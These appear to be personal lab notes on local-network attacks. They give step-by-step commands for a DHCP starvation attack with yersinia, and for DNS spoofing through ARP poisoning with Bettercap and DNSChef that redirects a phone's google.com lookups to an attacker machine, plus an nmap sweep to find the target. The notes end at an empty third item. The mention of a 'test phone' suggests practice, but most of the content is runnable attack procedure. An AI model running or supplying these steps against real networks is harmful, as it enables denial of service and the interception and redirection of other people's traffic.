1. --yersinia - 
    DHCP starvation attack (fills all the space so no one can connect)
    *sudo yersinia -G (-G for graphical nterface)/ udo yersinia -I
    press g and select DHCP 
    press x for attack menue and send packets

2. --Ettercap or Bettercap + DNSChef and DNS chef -
    DNS spoofing Attack
    -Step 1: Get in the Middle (ARP Poisoning)
    You use Bettercap to tell the phone you are the router and tell the router you are the phone.
    *sudo bettercap -iface eth0
    # Inside Bettercap:
    net.probe on
    set arp.spoof.targets <Phone_IP>
    arp.spoof on
    -Step 2: Start the Fake DNS Server
    You use DNSChef to create your "Fake Phonebook."
    *sudo apt install dnschef
    # Run it to point 'google.com' to your Kali IP:
    sudo dnschef --fakeip <Your_Kali_IP> --fakedomains google.com -i <Your_Kali_IP>
    -Step 3: Redirect the Traffic
    Once the phone is "poisoned" by Bettercap, it will send its DNS requests to you. DNSChef will answer: "Oh, you want google.com? It's at [Your_Kali_IP]!"

    Target IP: Use nmap -sn 192.168.1.0/24 to find the IP address of your test phone on the Wi-Fi.

3. 